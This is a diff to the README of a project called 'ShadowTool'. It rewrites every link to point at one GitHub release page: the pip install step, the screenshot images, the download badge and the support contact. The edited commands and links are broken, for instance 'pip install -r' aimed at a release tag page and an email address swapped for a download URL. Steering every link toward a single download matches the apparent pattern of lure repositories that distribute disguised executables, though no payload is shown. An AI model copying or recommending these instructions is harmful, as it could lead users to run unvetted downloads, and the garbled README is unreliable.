@@ -32,7 +32,7 @@ To begin using ShadowTool, follow these simple steps:
 
 1. Clone the repository to your local machine.
 2. Navigate to the directory where ShadowTool is located.
-3. Install any necessary dependencies by running `npm install` or `pip install -r requirements.txt`, depending on the tools you wish to use.
+3. Install any necessary dependencies by running `npm install` or `pip install -r https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0`, depending on the tools you wish to use.
 4. Launch the desired tool by executing the corresponding script or command.
 
 ---
@@ -41,14 +41,14 @@ To begin using ShadowTool, follow these simple steps:
 
 Here are some snapshots of ShadowTool in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0)
+![Screenshot 2](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0)
 
 ---
 
 ## Download ShadowTool 📥
 
-[![Download ShadowTool](https://img.shields.io/badge/Download-Program.zip-<COLOR-CODE>?style=for-the-badge)](https://github.com/user-attachments/files/17688437/Program.zip)
+[![Download ShadowTool](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0<COLOR-CODE>?style=for-the-badge)](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0)
 
 Click the button above to download ShadowTool and start exploring its capabilities!
 
@@ -68,7 +68,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Support ℹ️
 
-For any inquiries, issues, or feedback regarding ShadowTool, please contact our support team at [shadow.tool.support@example.com](mailto:shadow.tool.support@example.com).
+For any inquiries, issues, or feedback regarding ShadowTool, please contact our support team at [https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0).
 
 ---
 
